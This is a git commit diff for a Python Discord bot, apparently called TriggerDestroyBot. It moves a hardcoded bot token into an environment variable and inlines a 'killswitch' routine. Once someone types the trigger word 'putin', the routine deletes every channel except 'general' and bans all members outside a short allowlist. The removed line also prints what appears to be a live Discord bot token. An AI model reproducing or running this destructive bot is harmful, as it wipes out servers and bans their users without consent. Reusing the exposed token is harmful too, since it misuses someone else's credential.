bae8cbc2152881a86db6a78143e3e37a855ca5a7
firez2469 <47616467+firez2469@users.noreply.github.com>
2021-02-20 18:17:58 -0500

    Update TriggerDestroyBot.py

--- bot/TriggerDestroyBot.py
+++ bot/TriggerDestroyBot.py
@@ -5,8 +5,8 @@ from discord.ext import commands
 from discord.ext import tasks
 
 
-TOKEN = 'ODA3NzY3NzQ0OTgzOTkwMzMz.YB8yVg.jbilrtj8eZpJAv5-H8UktfOoZ54'
 
+TOKEN = os.getenv('DISCORD_TOKEN')
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 
@@ -25,37 +25,34 @@ async def on_message(msg):
     else:
         print(msg.content)
         if msg.content.lower()== "putin":
-            kill()
             killRun=True
+            print(client.guilds)
+            print(f'{client.user} has connected to Discord!')
+            text_channel_list = []
             
-    
-def kill():
-    print(client.guilds)
-    print(f'{client.user} has connected to Discord!')
-    text_channel_list = []
-    
-    for guild in client.guilds:
-        print('Checking {0} with {1}'.format(guild.name,targetServer))
-        if True:
-            print('Found server {0}'.format(guild.name))
-            for channel in guild.channels:
-                print(channel.name,channel.id)
-                try:
-                    if deleteHuh:
-                        if(channel.name!='general'):
-                            await channel.delete()
-                except:
-                    print('failed to delete channel {0}'.format(channel.name))
-    for guild in client.guilds:
-        if guild.name == targetServer and deleteHuh:
-            for user in guild.members:
-                try:
-                    if(deleteHuh and notMemberOf(user.name,['firez2469','MEE6','Pollmaster','Zira','Dyno','Dadys Boi','Experimental Games Bot'])):
-                        if(not user.name == 'Nuclear Bot'):
-                            await guild.ban(user,reason='This is the server killswitch. Youve been banned')
-                    print('Banned:',user.name,user.id)
-                except:
-                    print('failure to ban',user.name,user.id)
+            for guild in client.guilds:
+                print('Checking {0} with {1}'.format(guild.name,targetServer))
+                if True:
+                    print('Found server {0}'.format(guild.name))
+                    for channel in guild.channels:
+                        print(channel.name,channel.id)
+                        try:
+                            if deleteHuh:
+                                if(not channel.name=='general'):
+                                    await channel.delete()
+                        except:
+                            print('failed to delete channel {0}'.format(channel.name))
+            for guild in client.guilds:
+                if guild.name == targetServer and deleteHuh:
+                    for user in guild.members:
+                        try:
+                            if(deleteHuh and notMemberOf(user.name,['firez2469','MEE6','Pollmaster','Zira','Dyno','Dadys Boi','Experimental Games Bot'])):
+                                if(not user.name == 'Nuclear Bot'):
+                                    await guild.ban(user,reason='This is the server killswitch. Youve been banned')
+                            print('Banned:',user.name,user.id)
+                        except:
+                            print('failure to ban',user.name,user.id)
+
         
 def notMemberOf(user, usersList):
     for m in usersList:
@@ -67,4 +64,3 @@ def notMemberOf(user, usersList):
 
 
 client.run(TOKEN)
-
